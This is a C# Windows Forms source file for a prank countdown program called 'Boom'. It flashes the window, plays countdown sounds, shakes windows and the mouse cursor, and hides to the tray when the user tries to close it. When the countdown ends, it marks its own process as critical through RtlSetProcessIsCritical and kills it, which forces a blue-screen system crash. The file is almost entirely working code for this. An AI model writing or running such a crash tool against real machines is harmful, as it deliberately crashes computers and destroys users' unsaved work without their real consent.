﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Media;
using static Boom.Form1;

namespace Boom
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == '\r')
            {
                button1.Focus();
                return;
            }
            if (e.KeyChar >= '0' && e.KeyChar <= '9' || e.KeyChar == '\b') return;
            e.Handled = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            button1.Text = "Activated";
            label3.Text = "After";
            label2.Text = "Explode";
            label2.Font = new Font("宋体", 17F);
            textBox1.Visible = button1.Enabled = false;
            label5.Visible = true;
            backgroundWorker1.RunWorkerAsync();
        }

        private void textBox1_Enter(object sender, EventArgs e)
        {
            textBox1.BorderStyle = BorderStyle.Fixed3D;
            textBox1.BackColor = SystemColors.Window;
            textBox1.SelectAll();
        }

        private void textBox1_Leave(object sender, EventArgs e)
        {
            textBox1.BorderStyle = BorderStyle.None;
            textBox1.BackColor = SystemColors.Control;
            try
            {
                textBox1.Text = int.Parse(textBox1.Text).ToString().PadLeft(3, '0');
                label5.Text = textBox1.Text;
            }
            catch { }
        }

        public void BSoD()
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
            Process.GetCurrentProcess().Kill();
        }

        /// <summary>
        /// 释放UnmanagedMemoryStream至指定位置
        /// </summary>
        /// <param name="resource">要求保存的UnmanagedMemoryStream</param>
        /// <param name="path">释放到位置</param>
        private void ExtractFile(UnmanagedMemoryStream resource, string path)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            BufferedStream input = new BufferedStream(resource);
            FileStream output = new FileStream(path, FileMode.Create);
            byte[] data = new byte[1024];
            int lengthEachRead;
            while ((lengthEachRead = input.Read(data, 0, data.Length)) > 0) output.Write(data, 0, lengthEachRead);
            output.Flush();
            output.Close();
        }

        delegate void SetTextCallBack(string text);

        private void SetText2Label5(string text)
        {
            if (label5.InvokeRequired)
            {
                SetTextCallBack stcb = new SetTextCallBack(SetText2Label5);
                Invoke(stcb, new object[] { text });
            }
            else label5.Text = text;
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            //MediaPlayer media = new MediaPlayer();
            //ExtractFile("Countdown", Environment.GetEnvironmentVariable("tmp") + "\\" + "countdown.wav");
            //media.Open(new Uri("file:\\\\\\" + Environment.GetEnvironmentVariable("tmp") + "\\" + "countdown.wav"));
            int t = int.Parse(textBox1.Text);
            if (t < 18)
            {
                PlaySound(Properties.Resources.Countdown2, t - 3);
                if (t < 10) backgroundWorker2.RunWorkerAsync();
            }
            backgroundWorker3.RunWorkerAsync();
            for (int i = 1; i < t+1; i++)
            {
                if (t - i > 17) PlaySound(Properties.Resources.Countdown, 0);
                SetText2Label5((t - i).ToString().PadLeft(3, '0'));
                notifyIcon1.Text = (t - i).ToString().PadLeft(3, '0') + "s";
                switch (t - i)
                {
                    case 0:
                        ForeColor = System.Drawing.Color.Red;
                        label2.Text += "d";
                        notifyIcon1.Text = "Exploded";
                        break;
                    case 10:
                        backgroundWorker2.RunWorkerAsync();
                        break;
                    case 17:
                        PlaySound(Properties.Resources.Countdown2, 0);
                        break;
                }
                Thread.Sleep(1000);
            }
            BSoD();
            Environment.Exit(0);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            MusicPlayer.Stop("countdown");
            MusicPlayer.Close("countdown");
            if (button1.Enabled) return;
            notifyIcon1.Visible = true;
            Hide();
            e.Cancel = true;
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        { Show(); }
        
        private void ShakeWindow()
        {
            Random ran = new Random((int)DateTime.Now.Ticks);
            int range = 5;
            int sleepTime = 10;
            Point oldPoint = Location;
            Location = new Point(oldPoint.X + ran.Next(-range, range), oldPoint.Y + ran.Next(-range, range));
            Thread.Sleep(sleepTime);
            Location = oldPoint;
        }

        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                WindowShaker.ShakeCurrentWindows();
                WindowShaker.ShakeMouse();
            }
        }

        private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                BackColor = System.Drawing.Color.FromArgb(204, 2, 2);
                panel1.BackColor = SystemColors.Control;
                Thread.Sleep(250);
                BackColor = SystemColors.Control;
                Thread.Sleep(250);
                BackColor = System.Drawing.Color.FromArgb(238, 210, 2);
                panel1.BackColor = SystemColors.Control;
                Thread.Sleep(250);
                BackColor = SystemColors.Control;
                Thread.Sleep(250);
            }
        }

        public static class WindowShaker
        {
            public static void ShakeMouse()
            {
                Random random = new Random();
                Size newPosition = new Size(random.Next(-10, 10), random.Next(-10, 10));
                Point oldPosition = Cursor.Position;
                Cursor.Position = Point.Add(Cursor.Position, newPosition);
                Thread.Sleep(20);
                Cursor.Position = oldPosition;
            }
            [DllImport("user32.dll")]
            private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

            [DllImport("user32.dll")]
            private static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

            [StructLayout(LayoutKind.Sequential)]
            private struct RECT
            {
                public int Left;
                public int Top;
                public int Right;
                public int Bottom;
            }

            public static void ShakeCurrentWindows()
            {
                Random random = new Random();

                foreach (var form in Application.OpenForms)
                {
                    IntPtr handle = ((Form)form).Handle;
                    RECT rect;
                    GetWindowRect(handle, out rect);
                    int width = rect.Right - rect.Left;
                    int height = rect.Bottom - rect.Top;
                    int newX = random.Next(-10, 10);
                    int newY = random.Next(-10, 10);
                    MoveWindow(handle, rect.Left + newX, rect.Top + newY, width, height, true);
                    Thread.Sleep(20);
                    MoveWindow(handle, rect.Left, rect.Top, width, height, true);
                }
            }

            [DllImport("user32.dll")]
            private static extern IntPtr GetDesktopWindow();

            [DllImport("user32.dll")]
            private static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

            [DllImport("user32.dll")]
            private static extern bool SetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

            [StructLayout(LayoutKind.Sequential)]
            private struct WINDOWPLACEMENT
            {
                public int length;
                public int flags;
                public int showCmd;
                public Point ptMinPosition;
                public Point ptMaxPosition;
                public RECT rcNormalPosition;
            }

            public static void Shake()
            {
                Random random = new Random();

                // Shake the desktop
                RECT desktopRect;
                GetWindowRect(GetDesktopWindow(), out desktopRect);
                int desktopWidth = desktopRect.Right - desktopRect.Left;
                int desktopHeight = desktopRect.Bottom - desktopRect.Top;

                for (int i = 0; i < 20; i++)
                {
                    int newX = random.Next(-10, 10);
                    int newY = random.Next(-10, 10);
                    MoveWindow(GetDesktopWindow(), desktopRect.Left + newX, desktopRect.Top + newY, desktopWidth, desktopHeight, true);
                    Thread.Sleep(10);
                }

                // Shake all open windows
                foreach (var form in Application.OpenForms)
                {
                    IntPtr handle = ((Form)form).Handle;
                    WINDOWPLACEMENT placement = new WINDOWPLACEMENT();
                    placement.length = Marshal.SizeOf(placement);
                    GetWindowPlacement(handle, ref placement);
                    RECT rect = placement.rcNormalPosition;
                    int width = rect.Right - rect.Left;
                    int height = rect.Bottom - rect.Top;

                    for (int i = 0; i < 20; i++)
                    {
                        int newX = random.Next(-10, 10);
                        int newY = random.Next(-10, 10);
                        MoveWindow(handle, rect.Left + newX, rect.Top + newY, width, height, true);
                        Thread.Sleep(10);
                    }

                    // Restore the window placement
                    SetWindowPlacement(handle, ref placement);
                }
            }

            [DllImport("user32.dll")]
            private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

            [DllImport("user32.dll")]
            private static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll")]
            private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

            [DllImport("user32.dll")]
            private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

            private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

            public static void Shake2()
            {
                Random random = new Random();

                // Shake the desktop
                RECT desktopRect;
                GetWindowRect(GetDesktopWindow(), out desktopRect);
                int desktopWidth = desktopRect.Right - desktopRect.Left;
                int desktopHeight = desktopRect.Bottom - desktopRect.Top;

                for (int i = 0; i < 20; i++)
                {
                    int newX = random.Next(-10, 10);
                    int newY = random.Next(-10, 10);
                    MoveWindow(GetDesktopWindow(), desktopRect.Left + newX, desktopRect.Top + newY, desktopWidth, desktopHeight, true);
                    Thread.Sleep(10);
                }

                // Shake all open windows
                EnumWindows(delegate (IntPtr hWnd, IntPtr lParam)
                {
                    if (hWnd != GetDesktopWindow() && hWnd != GetForegroundWindow())
                    {
                        uint processId;
                        GetWindowThreadProcessId(hWnd, out processId);
                        if (processId != 0)
                        {
                            IntPtr handle = GetWindow(hWnd, 5); // 5 == GW_OWNER
                            if (handle == IntPtr.Zero)
                            {
                                WINDOWPLACEMENT placement = new WINDOWPLACEMENT();
                                placement.length = Marshal.SizeOf(placement);
                                GetWindowPlacement(hWnd, ref placement);
                                RECT rect = placement.rcNormalPosition;
                                int width = rect.Right - rect.Left;
                                int height = rect.Bottom - rect.Top;

                                for (int i = 0; i < 20; i++)
                                {
                                    int newX = random.Next(-10, 10);
                                    int newY = random.Next(-10, 10);
                                    MoveWindow(hWnd, rect.Left + newX, rect.Top + newY, width, height, true);
                                    Thread.Sleep(10);
                                }
                                SetWindowPlacement(hWnd, ref placement);
                            }
                        }
                    }
                    return true;
                }, IntPtr.Zero);
            }

            [DllImport("user32.dll")]
            static extern bool IsWindowVisible(IntPtr hWnd);

            [DllImport("user32.dll")]
            static extern bool EnumChildWindows(IntPtr hWndParent, EnumWindowsProc lpEnumFunc, IntPtr lParam);

            [DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

            [DllImport("user32.dll")]
            static extern bool SetCursorPos(int X, int Y);

            static Random random = new Random();

            public static void ShakeAllWindows()
            {
                int currentProcessId = Process.GetCurrentProcess().Id;
                const int SW_SHOWMINIMIZED = 2;
                const int SW_RESTORE = 9;

                IntPtr desktopHandle = GetDesktopWindow();

                List<IntPtr> allWindowHandles = new List<IntPtr>();
                EnumChildWindows(desktopHandle, (handle, lParam) =>
                {
                    allWindowHandles.Add(handle);
                    return true;
                }, IntPtr.Zero);

                foreach (var windowHandle in allWindowHandles)
                {
                    if (IsWindowVisible(windowHandle))
                    {
                        uint processId;
                        GetWindowThreadProcessId(windowHandle, out processId);

                        if (processId != currentProcessId && IsWindowVisible(windowHandle))
                        {
                            ShowWindow(windowHandle, SW_SHOWMINIMIZED);
                            ShowWindow(windowHandle, SW_RESTORE);

                            Point oldPosition = Cursor.Position;
                            for (int i = 0; i < 10; i++)
                            {
                                int dx = random.Next(10) - 5;
                                int dy = random.Next(10) - 5;
                                Point newPosition = new Point(oldPosition.X + dx, oldPosition.Y + dy);
                                SetCursorPos(newPosition.X, newPosition.Y);
                                Thread.Sleep(20);
                            }
                            SetCursorPos(oldPosition.X, oldPosition.Y); 
                        }
                    }
                }
            }

        }

        public class MusicPlayer
        {
            /// <summary>
            /// 播放器别名
            /// </summary>
            public string alias
            {
                get { return _alias; }
                set { _alias = value.Replace("\n", "").Replace(" ", "").Replace("\t", "").Replace("\r", ""); }
            }

            private string _alias;

            //public static uint SND_ASYNC = 0x0001;
            //public static uint SND_FILENAME = 0x00020000;

            [DllImport("winmm.dll")]
            public static extern uint mciSendString(string lpstrCommand, string lpstrReturnString, uint uReturnLength, uint hWndCallback);

            /// <summary>
            /// 初始化MusicPlayer
            /// </summary>
            /// <param name="alias">音乐别名</param>
            public MusicPlayer(string alias)
            { this.alias = alias; }

            /// <summary>
            /// 关闭文件
            /// </summary>
            public void Close()
            { mciSendString(@"close " + alias, null, 0, 0); }
            /// <summary>
            /// 关闭文件
            /// </summary>
            /// <param name="alias">音乐别名</param>
            public static void Close(string alias)
            { mciSendString(@"close " + alias, null, 0, 0); }

            /// <summary>
            /// 打开文件
            /// </summary>
            /// <param name="file">文件地址</param>
            public void Open(string file)
            { mciSendString("open \"" + file + "\" alias " + alias, null, 0, 0); }
            /// <summary>
            /// 打开文件
            /// </summary>
            /// <param name="file">文件地址</param>
            /// <param name="alias">音乐别名</param>
            public static void Open(string file, string alias)
            { mciSendString("open \"" + file + "\" alias " + alias, null, 0, 0); }

            /// <summary>
            /// 停止当前音乐播放
            /// </summary>
            public void Stop()
            { mciSendString(@"close " + alias, null, 0, 0); }
            /// <summary>
            /// 停止当前音乐播放
            /// </summary>
            /// <param name="alias">音乐别名</param>
            public static void Stop(string alias)
            { mciSendString(@"close " + alias, null, 0, 0); }

            /// <summary>
            /// 跳到指定地点播放
            /// </summary>
            public void JumpTo(long millisecond)
            { mciSendString(@"seek " + alias + " to " + millisecond, null, 0, 0); }
            /// <summary>
            /// 跳到指定地点播放
            /// </summary>
            /// <param name="alias">音乐别名</param>
            public static void JumpTo(long millisecond, string alias)
            { mciSendString(@"seek " + alias + " to " + millisecond, null, 0, 0); }

            /// <summary>
            /// 播放音乐
            /// </summary>
            /// <param name="hWndCallback">Callback句柄</param>
            public void Play(uint hWndCallback)
            { mciSendString(@"play " + alias + " notify", null, 0, hWndCallback); }
            /// <summary>
            /// 播放音乐
            /// </summary>
            /// <param name="hWndCallback">Callback句柄</param>
            /// <param name="alias">音乐别名</param>
            public static void Play(uint hWndCallback, string alias)
            { mciSendString(@"play " + alias + " notify", null, 0, hWndCallback); }
            /// <summary>
            /// 播放音乐
            /// </summary>
            /// <param name="loop">是否循环</param>
            public void Play()
            //{ mciSendString(@"play " + alias + (loop ? " repeat" : ""), null, 0, 0); }
            { mciSendString("play " + alias, null, 0, 0); }
            /// <summary>
            /// 播放音乐
            /// </summary>
            /// <param name="loop">是否循环</param>
            /// <param name="alias">音乐别名</param>
            public static void Play(string alias)
            { mciSendString(@"play " + alias, null, 0, 0); }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //WindowShaker.ShakeAllWindows();
            string path = Environment.GetEnvironmentVariable("tmp") + "\\countdown.wav";
            ExtractFile(Properties.Resources.Countdown2, path);
            MusicPlayer musicPlayer = new MusicPlayer("countdown");
            musicPlayer.Open(path);
            musicPlayer.JumpTo(10*1000);
            musicPlayer.Play((uint)Handle);
        }

        protected override void DefWndProc(ref Message m)
        {
            base.DefWndProc(ref m);
            if (m.Msg == 0x3B9)
            {
                MusicPlayer musicPlayer = new MusicPlayer("countdown");
                musicPlayer.Stop();
                musicPlayer.Close();
            }
        }

        private void PlaySound(UnmanagedMemoryStream resource, int start_at)
        {
            MusicPlayer musicPlayer = new MusicPlayer("countdown");
            musicPlayer.Stop();
            musicPlayer.Close();
            string path = Environment.GetEnvironmentVariable("tmp") + "\\sound.wav";
            ExtractFile(resource, path);
            musicPlayer.Open(path);
            musicPlayer.JumpTo(start_at * 1000);
            musicPlayer.Play((uint)Handle);
        }
    }
}
